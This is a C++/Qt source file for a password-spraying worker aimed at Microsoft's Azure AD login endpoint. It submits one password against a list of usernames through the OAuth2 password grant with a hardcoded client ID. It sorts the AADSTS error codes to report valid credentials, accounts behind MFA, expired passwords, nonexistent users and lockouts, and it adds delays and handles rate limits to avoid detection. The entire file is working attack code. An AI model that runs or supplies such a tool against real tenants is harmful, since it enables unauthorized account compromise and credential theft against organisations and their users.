#include "SprayWorker.h"
#include <QNetworkRequest>
#include <QUrlQuery>
#include <QJsonDocument>
#include <QJsonObject>
#include <QDateTime>
#include <QEventLoop>
#include <QTimer>

SprayWorker::SprayWorker(const QStringList& users, const QString& password, int delayMs, QObject* parent)
    : QThread(parent), users(users), password(password), delayMs(delayMs), stopFlag(false) {}

void SprayWorker::setDelay(int delayMs) {
    this->delayMs = delayMs;
}

void SprayWorker::stop() {
    QMutexLocker locker(&stopMutex);
    stopFlag = true;
}

void SprayWorker::run() {
    int total = users.size();
    emit progress(QString("[*] Started: %1").arg(QDateTime::currentDateTime().toString()), QColor("yellow"));
    if (delayMs > 0) {
        emit progress(QString("[*] Using %1ms delay between requests").arg(delayMs), QColor("yellow"));
    }

    // Create NAM once for all requests (more efficient)
    QNetworkAccessManager nam;

    for (int i = 0; i < users.size(); i++) {
        {
            QMutexLocker locker(&stopMutex);
            if (stopFlag) {
                emit progress("[!] Spray stopped by user", QColor("yellow"));
                break;
            }
        }

        QString user = users.at(i);
        emit progress(QString("[%1/%2] Trying: %3").arg(i + 1).arg(total).arg(user), QColor("lightblue"));

        // Build request
        QUrl url("https://login.microsoftonline.com/common/oauth2/token");
        QNetworkRequest req{url};
        req.setHeader(QNetworkRequest::ContentTypeHeader, "application/x-www-form-urlencoded");
        req.setRawHeader("Accept", "application/json");
        req.setRawHeader("Connection", "close");
        req.setTransferTimeout(10000); // 10 second timeout

        QUrlQuery params;
        params.addQueryItem("resource", "https://graph.windows.net");
        params.addQueryItem("client_id", "1b730954-1685-4b74-9bfd-dac224a7b894");
        params.addQueryItem("client_info", "1");
        params.addQueryItem("grant_type", "password");
        params.addQueryItem("username", user);
        params.addQueryItem("password", password);
        params.addQueryItem("scope", "openid");

        QNetworkReply* reply = nam.post(req, params.toString(QUrl::FullyEncoded).toUtf8());

        // Null check for reply
        if (!reply) {
            emit progress("[!] Failed to create network request", QColor("red"));
            continue;
        }

        // Block until finished with timeout
        QEventLoop loop;
        QTimer timer;
        timer.setSingleShot(true);
        QObject::connect(&timer, &QTimer::timeout, &loop, &QEventLoop::quit);
        QObject::connect(reply, &QNetworkReply::finished, &loop, &QEventLoop::quit);
        timer.start(10000); // 10s timeout
        loop.exec();

        if (!reply->isFinished()) {
            emit progress("[!] Request timed out", QColor("red"));
            reply->abort();
        } else {
            QByteArray respData = reply->readAll();
            int status = reply->attribute(QNetworkRequest::HttpStatusCodeAttribute).toInt();

            if (status == 200) {
                emit progress(QString("[+] SUCCESS: %1 : %2").arg(user, password), QColor("green"));
            } else if (status == 429) {
                // Rate limited - extract retry-after
                QByteArray retryAfter = reply->rawHeader("Retry-After");
                int waitSecs = retryAfter.isEmpty() ? 60 : retryAfter.toInt();
                emit progress(QString("[!] RATE LIMITED - Azure says wait %1s").arg(waitSecs), QColor("orange"));
                emit progress("[!] Consider increasing delay between requests", QColor("orange"));
            } else {
                QString text = QString::fromUtf8(respData);

                if (text.contains("AADSTS50126")) {
                    emit progress("[-] Invalid password", QColor("red"));
                } else if (text.contains("AADSTS50034")) {
                    emit progress("[!] User not found", QColor("red"));
                } else if (text.contains("AADSTS50079") || text.contains("AADSTS50076")) {
                    emit progress(QString("[+] MFA required (valid creds): %1").arg(user), QColor("green"));
                } else if (text.contains("AADSTS50053")) {
                    emit progress("[!] Account locked - STOP SPRAYING THIS USER", QColor("orange"));
                } else if (text.contains("AADSTS50055")) {
                    emit progress(QString("[+] Password expired (valid creds): %1").arg(user), QColor("green"));
                } else if (text.contains("AADSTS50057")) {
                    emit progress("[!] Account disabled", QColor("red"));
                } else if (text.contains("AADSTS50158")) {
                    emit progress(QString("[+] External validation required: %1").arg(user), QColor("green"));
                } else if (text.contains("AADSTS700016")) {
                    emit progress("[!] Bad client ID - check spray configuration", QColor("orange"));
                } else if (text.contains("AADSTS90561") || text.contains("AADSTS900561")) {
                    emit progress("[!] Account too new or not fully provisioned", QColor("red"));
                } else {
                    // Try to extract error code from response
                    QJsonDocument doc = QJsonDocument::fromJson(respData);
                    QString errCode = doc.object().value("error").toString();
                    QString errDesc = doc.object().value("error_description").toString();
                    if (!errCode.isEmpty()) {
                        emit progress(QString("[?] %1: %2").arg(errCode, errDesc.left(80)), QColor("red"));
                    } else {
                        emit progress("[?] Unknown error", QColor("red"));
                        emit progress(text.left(100) + "...", QColor("red"));
                    }
                }
            }
        }
        reply->deleteLater();

        // Apply delay between requests if configured
        if (delayMs > 0 && i < users.size() - 1) {
            QThread::msleep(delayMs);
        }
    }

    emit progress(QString("[*] Completed at %1").arg(QDateTime::currentDateTime().toString()), QColor("yellow"));
    emit finished();
}
